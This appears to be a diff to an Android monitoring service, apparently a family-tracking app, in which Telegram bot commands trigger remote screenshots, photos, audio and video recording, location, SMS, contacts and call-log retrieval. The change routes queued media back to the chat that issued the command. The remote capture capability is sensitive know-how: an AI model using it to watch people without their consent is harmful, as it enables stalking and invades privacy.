@@ -465,7 +465,7 @@ class MonitoringService : Service() {
             "com.android.mms"
         )
         private val CONTROL_COMMANDS = setOf("/stop", "/pause", "/resume", "/restart", "/logout", "/clearqueue", "/lock")
-        private val SENSITIVE_COMMANDS = setOf("/screenshot", "/photo", "/location", "/lastcalls", "/lastsms", "/lastnotify", "/contacts", "/history", "/track", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage", "/perms", "/brief", "/alive", "/checkdead", "/screentime", "/digest", "/weekly", "/alertness", "/audit")
+        private val SENSITIVE_COMMANDS = setOf("/screenshot", "/photo", "/record", "/recordvideo", "/location", "/lastcalls", "/lastsms", "/lastnotify", "/contacts", "/history", "/track", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage", "/perms", "/brief", "/alive", "/checkdead", "/screentime", "/digest", "/weekly", "/alertness", "/audit")
         private val ALIAS_COMMANDS = mapOf("dimana" to "/location", "lokasi" to "/location", "posisi" to "/location", "foto" to "/photo", "photo" to "/photo", "ding" to "/ring", "bunyi" to "/ring", "kunci" to "/lock", "baterai" to "/battery", "batre" to "/battery", "bantu" to "/help", "tolong" to "/help", "menu" to "/help", "lanjut" to "/resume", "versi" to "/version", "sms" to "/sms", "darurat" to "/emergency", "minggu" to "/weekly", "laporan" to "/weekly", "pulang" to "/curfew", "jejak" to "/track", "waspada" to "/alertness", "hilang" to "/lost", "jemput" to "/pickup", "cekmati" to "/checkdead", "ujimati" to "/checkdead", "sembuh" to "/recover", "pulih" to "/recover", "layar" to "/screentime", "screentime" to "/screentime", "kendara" to "/driving", "berkendara" to "/driving", "kendaraan" to "/driving", "datasaver" to "/datasaver", "hematkuota" to "/datasaver", "kuota" to "/datasaver", "restore" to "/restore", "screenshot" to "/screenshot", "status" to "/status")
         // Frasa perintah dua kata (issue #777): bentuk berjarak dari
         // perintah yang sama — sebelumnya hanya kata pertama yang
@@ -4482,7 +4482,7 @@ class MonitoringService : Service() {
                     sendToTelegram("⏸️ Monitoring dijeda. Kirim /resume dulu.")
                 } else {
                     sendToTelegram("\uD83D\uDDA5 Ambil layar…")
-                    captureAndSendScreenshot()
+                    captureAndSendScreenshot(replyOverrideChatId)
                 }
             }
             "/status" -> handleStatusCommand(privateChat)
@@ -4680,7 +4680,7 @@ class MonitoringService : Service() {
             bumpLocFailCount()
             sendToTelegram("📍 Lokasi tak didapat: " + locationFailureHint() + "\nBaterai: ${if (level in 0..100) "$level%" else "?"}")
         }
-        try { captureAndSendPhoto(reportResult = true) } catch (_: Exception) { }
+        try { captureAndSendPhoto(reportResult = true, replyOverrideChatId) } catch (_: Exception) { }
     }
 
     private suspend fun handleJemputCommand(arg: String) {
@@ -6102,7 +6102,7 @@ class MonitoringService : Service() {
             bumpLocFailCount()
             sendToTelegram("📍 Lokasi tak didapat: " + locationFailureHint() + "\nBaterai: ${if (level in 0..100) "$level%" else "?"}")
         }
-        try { captureAndSendPhoto(reportResult = true) } catch (_: Exception) { }
+        try { captureAndSendPhoto(reportResult = true, replyOverrideChatId) } catch (_: Exception) { }
     }
 
     private suspend fun handleJampulangCommand(arg: String, privateChat: Boolean) {
@@ -6171,7 +6171,7 @@ class MonitoringService : Service() {
             recordingKind = "audio"
             recordJob = serviceScope.launch {
                 try {
-                    recordAndSendAudio(seconds)
+                    recordAndSendAudio(seconds, replyOverrideChatId)
                 } finally {
                     recordingKind = ""
                     recordBusy.set(false)
@@ -6207,7 +6207,7 @@ class MonitoringService : Service() {
             recordingKind = "video"
             recordJob = serviceScope.launch {
                 try {
-                    recordAndSendVideo(seconds)
+                    recordAndSendVideo(seconds, replyOverrideChatId)
                 } catch (e: Throwable) {
                     recordBusy.set(false)
                     recorderActive.set(false)
@@ -6755,7 +6755,7 @@ class MonitoringService : Service() {
         } else {
             sendToTelegram("📸 Ambil foto sekarang…")
         }
-        captureAndSendPhoto(reportResult = true)
+        captureAndSendPhoto(reportResult = true, replyOverrideChatId)
     }
 
     private suspend fun handleStatusCommand(privateChat: Boolean) {
@@ -11493,7 +11493,7 @@ class MonitoringService : Service() {
     // CAMERA MONITORING FUNCTIONS
     // ═══════════════════════════════════════════════════════════
 
-    private fun captureAndSendPhoto(reportResult: Boolean = false) {
+    private fun captureAndSendPhoto(reportResult: Boolean = false, chatTujuan: String = "") {
         if (!photoPreconditions(reportResult)) return
         if (recordingKind == "video") {
             if (reportResult) {
@@ -11745,8 +11745,10 @@ class MonitoringService : Service() {
                     android.util.Log.i("MonitoringService", "Hemat kuota: foto otomatis ditahan sampai tersambung Wi-Fi")
                     return@launch
                 }
-                when (sendPhotoFile(photoFile)) {
+                simpanTujuanMedia(photoFile, chatTujuan)
+                when (sendPhotoFile(photoFile, chatTujuan)) {
                     MediaSendOutcome.SENT -> {
+                        hapusTujuanMedia(photoFile)
                         if (reportResult && spreadAwal in 0..PhotoFingerprint.FEATURELESS_SPREAD) {
                             try { sendToTelegram("📷 Catatan: foto nyaris tanpa detail — mungkin buram atau lensa kotor/tertutup sebagian.") } catch (_: Exception) { }
                         }
@@ -11774,6 +11776,7 @@ class MonitoringService : Service() {
                         flushPendingPhotos()
                     }
                     MediaSendOutcome.DROPPED -> {
+                        hapusTujuanMedia(photoFile)
                         prunePhotoCache()
                         if (reportResult) {
                             sendToTelegram("⚠️ Foto dibuang — berkas kosong, tak didukung, atau terlalu besar untuk Telegram.")
@@ -11871,7 +11874,7 @@ class MonitoringService : Service() {
         }
     }
 
-    private fun captureAndSendScreenshot() {
+    private fun captureAndSendScreenshot(chatTujuan: String = "") {
         if (NetworkUtils.isAuthBlocked(preferencesManager)) {
             serviceScope.launch {
                 sendToTelegram("Token ditolak — tangkap layar ditahan sampai token diperbaiki di Setup.")
@@ -11963,7 +11966,8 @@ class MonitoringService : Service() {
                 shotNoFrameFailAt = 0L
                 markMediaActive(shotFile)
                 try {
-                    val hasilKirimShot = sendPhotoFile(shotFile)
+                    simpanTujuanMedia(shotFile, chatTujuan)
+                    val hasilKirimShot = sendPhotoFile(shotFile, chatTujuan)
                     // Watchdog hanya menjaga unggahan berkas ini;
                     // cabang SENT menjalankan flush dengan tenggat
                     // sendiri (600 dtk) yang sah melebihi sisa
@@ -11971,6 +11975,7 @@ class MonitoringService : Service() {
                     try { wdUp.cancel() } catch (_: Exception) { }
                     when (hasilKirimShot) {
                         MediaSendOutcome.SENT -> {
+                            hapusTujuanMedia(shotFile)
                             if (lastShotStaleFrame) {
                                 lastShotStaleFrame = false
                                 sendToTelegram("ℹ️ Yang terkirim adalah bingkai terakhir yang tertangkap (layar tak menghasilkan bingkai baru) — tampilannya mungkin bukan yang paling kini.")
@@ -11978,6 +11983,7 @@ class MonitoringService : Service() {
                             flushPendingPhotos()
                         }
                         MediaSendOutcome.DROPPED -> {
+                            hapusTujuanMedia(shotFile)
                             prunePhotoCache()
                             sendToTelegram("⚠️ Tangkap layar dibuang — berkas kosong, tak didukung, atau terlalu besar untuk Telegram.")
                         }
@@ -13342,7 +13348,7 @@ class MonitoringService : Service() {
         }
     }
 
-    private suspend fun recordAndSendAudio(seconds: Int) {
+    private suspend fun recordAndSendAudio(seconds: Int, chatTujuan: String = "") {
         if (!hasMicPermission()) {
             sendToTelegram("⚠️ Izin Mikrofon belum diberikan. Buka Setup dan berikan izin Mikrofon.")
             return
@@ -13527,7 +13533,8 @@ class MonitoringService : Service() {
                 }
                 return
             }
-            val uploadOutcome = kotlinx.coroutines.withTimeoutOrNull(AUDIO_UPLOAD_TIMEOUT_MS) { sendAudioFile(audioFile) }
+            simpanTujuanMedia(audioFile, chatTujuan)
+            val uploadOutcome = kotlinx.coroutines.withTimeoutOrNull(AUDIO_UPLOAD_TIMEOUT_MS) { sendAudioFile(audioFile, chatTujuan) }
             if (uploadOutcome == null) {
                 keepForRetry = true
                 audioOutcome = MediaSendOutcome.KEPT
@@ -13539,6 +13546,7 @@ class MonitoringService : Service() {
                 return
             }
             audioOutcome = uploadOutcome
+            if (audioOutcome != MediaSendOutcome.KEPT) hapusTujuanMedia(audioFile)
             when (audioOutcome) {
                 MediaSendOutcome.SENT -> {
                     try {
@@ -13646,7 +13654,7 @@ class MonitoringService : Service() {
         }
     }
 
-    private suspend fun sendAudioFile(audioFile: File): MediaSendOutcome {
+    private suspend fun sendAudioFile(audioFile: File, chatTujuan: String = ""): MediaSendOutcome {
         try {
             if (!audioFile.exists() || audioFile.length() == 0L) {
                 deleteQuietly(audioFile)
@@ -13661,9 +13669,15 @@ class MonitoringService : Service() {
             // Chat tujuan menghormati override perintah
             // sensitif (issue #1548): /photo, /screenshot,
             // /record* yang diketik dari chat privat tak
-            // boleh menerbitkan medianya ke grup. Di luar
-            // jendela perintah override kosong = konfigurasi.
-            val chatId = replyOverrideChatId.ifEmpty { chatIdMentah }
+            // boleh menerbitkan medianya ke grup. Tujuan
+            // eksplisit chatTujuan (issue #1720) didahulukan:
+            // ia ditangkap pemanggil SAAT perintah berjalan,
+            // karena jepret/rekam asinkron mengirim sesudah
+            // jendela override ditutup — membaca jendela di
+            // sini saja membuat muatan media selalu bocor ke
+            // chat terkonfigurasi. Di luar jendela perintah
+            // override kosong = konfigurasi.
+            val chatId = chatTujuan.ifEmpty { replyOverrideChatId }.ifEmpty { chatIdMentah }
             if (botToken.isEmpty() || chatId.isEmpty()) return MediaSendOutcome.KEPT
             val requestFile = audioFile.asRequestBody("audio/mp4".toMediaTypeOrNull())
             val audioPart = MultipartBody.Part.createFormData("audio", audioFile.name, requestFile)
@@ -13713,7 +13727,7 @@ class MonitoringService : Service() {
         }
     }
 
-    private fun recordAndSendVideo(seconds: Int) {
+    private fun recordAndSendVideo(seconds: Int, chatTujuan: String = "") {
         if (NetworkUtils.isAuthBlocked(preferencesManager)) {
             recordBusy.set(false)
             recordingKind = ""
@@ -13824,9 +13838,11 @@ class MonitoringService : Service() {
                             } else {
                                 val usedSnapshot = try { cameraService.lastLensFacing } catch (_: Exception) { -1 }
                                 val askedSnapshot = try { selectedLensFacing() } catch (_: Exception) { -1 }
-                                val uploadOutcome = kotlinx.coroutines.withTimeoutOrNull(VIDEO_UPLOAD_TIMEOUT_MS) { sendVideoFile(videoFile) }
+                                simpanTujuanMedia(videoFile, chatTujuan)
+                                val uploadOutcome = kotlinx.coroutines.withTimeoutOrNull(VIDEO_UPLOAD_TIMEOUT_MS) { sendVideoFile(videoFile, chatTujuan) }
                                 when (uploadOutcome ?: MediaSendOutcome.KEPT) {
                                     MediaSendOutcome.SENT -> {
+                                        hapusTujuanMedia(videoFile)
                                         sendToTelegram("🎥 Video terkirim (${seconds} dtk).")
                                         // Pemberitahuan lensa cadangan
                                         // seperti jalur foto (issue #1266):
@@ -13893,7 +13909,7 @@ class MonitoringService : Service() {
         }
     }
 
-    private suspend fun sendVideoFile(videoFile: File): MediaSendOutcome {
+    private suspend fun sendVideoFile(videoFile: File, chatTujuan: String = ""): MediaSendOutcome {
         try {
             if (!videoFile.exists() || videoFile.length() == 0L) {
                 deleteQuietly(videoFile)
@@ -13911,9 +13927,15 @@ class MonitoringService : Service() {
             // Chat tujuan menghormati override perintah
             // sensitif (issue #1548): /photo, /screenshot,
             // /record* yang diketik dari chat privat tak
-            // boleh menerbitkan medianya ke grup. Di luar
-            // jendela perintah override kosong = konfigurasi.
-            val chatId = replyOverrideChatId.ifEmpty { chatIdMentah }
+            // boleh menerbitkan medianya ke grup. Tujuan
+            // eksplisit chatTujuan (issue #1720) didahulukan:
+            // ia ditangkap pemanggil SAAT perintah berjalan,
+            // karena jepret/rekam asinkron mengirim sesudah
+            // jendela override ditutup — membaca jendela di
+            // sini saja membuat muatan media selalu bocor ke
+            // chat terkonfigurasi. Di luar jendela perintah
+            // override kosong = konfigurasi.
+            val chatId = chatTujuan.ifEmpty { replyOverrideChatId }.ifEmpty { chatIdMentah }
             if (botToken.isEmpty() || chatId.isEmpty()) {
                 android.util.Log.e("MonitoringService", "Bot credentials missing")
                 return MediaSendOutcome.KEPT
@@ -13985,7 +14007,7 @@ class MonitoringService : Service() {
         prefix: String,
         ext: String,
         maxBytes: Long,
-        send: suspend (File) -> MediaSendOutcome,
+        send: suspend (File, String) -> MediaSendOutcome,
         droppedSummary: (Int) -> String,
         prune: (List<File>?) -> Unit
     ) {
@@ -14063,7 +14085,7 @@ class MonitoringService : Service() {
                     // yang justru menyasar berkas tua.
                     markMediaActive(file)
                     val result = try {
-                        kotlinx.coroutines.withTimeoutOrNull(remainMs) { send(file) }
+                        kotlinx.coroutines.withTimeoutOrNull(remainMs) { send(file, bacaTujuanMedia(file)) }
                     } finally {
                         clearMediaActive(file)
                     }
@@ -14072,6 +14094,7 @@ class MonitoringService : Service() {
                         continue
                     }
                     if (result == MediaSendOutcome.KEPT) continue
+                    hapusTujuanMedia(file)
                     monitorBeatAt = android.os.SystemClock.elapsedRealtime()
                     batchProgress = true
                     progress = true
@@ -14101,7 +14124,7 @@ class MonitoringService : Service() {
             prefix = "video_",
             ext = ".mp4",
             maxBytes = MAX_VIDEO_BYTES,
-            send = { sendVideoFile(it) },
+            send = { f, t -> sendVideoFile(f, t) },
             droppedSummary = { n -> "⚠️ $n berkas video tak bisa dikirim (kosong/tak didukung/terlalu besar) — dibuang." },
             prune = { pruneVideoCache(MAX_VIDEO_KEPT, it) }
         )
@@ -14174,7 +14197,7 @@ class MonitoringService : Service() {
             prefix = "audio_",
             ext = ".m4a",
             maxBytes = 0L,
-            send = { sendAudioFile(it) },
+            send = { f, t -> sendAudioFile(f, t) },
             droppedSummary = { n -> "\u26A0\uFE0F $n berkas rekaman tak bisa dikirim (kosong/tak didukung/terlalu besar) — dibuang." },
             prune = { pruneAudioCache(MAX_AUDIO_KEPT, it) }
         )
@@ -14395,13 +14418,53 @@ class MonitoringService : Service() {
         }
     }
 
+    // Peta tujuan media tertunda (issue #1720): media
+    // perintah yang tak terkirim langsung menyimpan
+    // chat tujuan tangkapannya di berkas peta ini agar
+    // flush berikutnya tetap mengirim ke chat itu,
+    // bukan ke chat terkonfigurasi. Satu berkas kecil
+    // seperti jurnal unggah tak pasti di atas.
+    private fun tujuanMediaFile(): java.io.File = java.io.File(antreMedia(), "media_tujuan.txt")
+
+    @Synchronized
+    private fun simpanTujuanMedia(file: java.io.File, chat: String) {
+        if (chat.isEmpty()) return
+        try {
+            val peta = tujuanMediaFile()
+            val lama = try { if (peta.exists()) peta.readLines().filter { it.isNotBlank() } else emptyList() } catch (_: Exception) { emptyList() }
+            val bersih = lama.filter { it.substringBefore("\t") != file.name }
+            peta.writeText((bersih + (file.name + "\t" + chat)).takeLast(50).joinToString("\n"))
+        } catch (_: Exception) {
+        }
+    }
+
+    private fun bacaTujuanMedia(file: java.io.File): String {
+        return try {
+            val peta = tujuanMediaFile()
+            if (!peta.exists()) "" else peta.readLines().firstOrNull { it.substringBefore("\t") == file.name }?.substringAfter("\t", "")?.trim() ?: ""
+        } catch (_: Exception) {
+            ""
+        }
+    }
+
+    @Synchronized
+    private fun hapusTujuanMedia(file: java.io.File) {
+        try {
+            val peta = tujuanMediaFile()
+            if (!peta.exists()) return
+            val sisa = peta.readLines().filter { it.isNotBlank() && it.substringBefore("\t") != file.name }
+            if (sisa.isEmpty()) peta.delete() else peta.writeText(sisa.joinToString("\n"))
+        } catch (_: Exception) {
+        }
+    }
+
     private fun labelUlangTakPasti(file: java.io.File): String =
         if (unggahTakPasti(file)) " (pengiriman ulang — salinan sebelumnya mungkin sudah sampai)" else ""
 
-    private suspend fun sendPhotoFile(photoFile: File): MediaSendOutcome =
-        photoSendMutex.withLock { sendPhotoFileUnlocked(photoFile) }
+    private suspend fun sendPhotoFile(photoFile: File, chatTujuan: String = ""): MediaSendOutcome =
+        photoSendMutex.withLock { sendPhotoFileUnlocked(photoFile, chatTujuan) }
 
-    private suspend fun sendPhotoFileUnlocked(photoFile: File): MediaSendOutcome {
+    private suspend fun sendPhotoFileUnlocked(photoFile: File, chatTujuan: String = ""): MediaSendOutcome {
         try {
             if (!photoFile.exists() || photoFile.length() == 0L) {
                 deleteQuietly(photoFile)
@@ -14420,9 +14483,15 @@ class MonitoringService : Service() {
             // Chat tujuan menghormati override perintah
             // sensitif (issue #1548): /photo, /screenshot,
             // /record* yang diketik dari chat privat tak
-            // boleh menerbitkan medianya ke grup. Di luar
-            // jendela perintah override kosong = konfigurasi.
-            val chatId = replyOverrideChatId.ifEmpty { chatIdMentah }
+            // boleh menerbitkan medianya ke grup. Tujuan
+            // eksplisit chatTujuan (issue #1720) didahulukan:
+            // ia ditangkap pemanggil SAAT perintah berjalan,
+            // karena jepret/rekam asinkron mengirim sesudah
+            // jendela override ditutup — membaca jendela di
+            // sini saja membuat muatan media selalu bocor ke
+            // chat terkonfigurasi. Di luar jendela perintah
+            // override kosong = konfigurasi.
+            val chatId = chatTujuan.ifEmpty { replyOverrideChatId }.ifEmpty { chatIdMentah }
 
             if (botToken.isEmpty() || chatId.isEmpty()) {
                 android.util.Log.e("MonitoringService", "Bot credentials missing")
@@ -14564,7 +14633,7 @@ class MonitoringService : Service() {
                     // Tandai aktif selama unggahan (issue #1410).
                     markMediaActive(file)
                     val photoResult = try {
-                        kotlinx.coroutines.withTimeoutOrNull(remainMs) { sendPhotoFile(file) }
+                        kotlinx.coroutines.withTimeoutOrNull(remainMs) { sendPhotoFile(file, bacaTujuanMedia(file)) }
                     } finally {
                         clearMediaActive(file)
                     }
@@ -14580,6 +14649,7 @@ class MonitoringService : Service() {
                     }
                     val photoOutcome = photoResult
                     if (photoOutcome == MediaSendOutcome.KEPT) continue
+                    hapusTujuanMedia(file)
                     if (fileIsHeld) {
                         try {
                             if (photoOutcome == MediaSendOutcome.SENT && PhotoFingerprint.isComparableFingerprint(fileHashFlush)) preferencesManager.setLastPhotoHashSync(fileHashFlush)
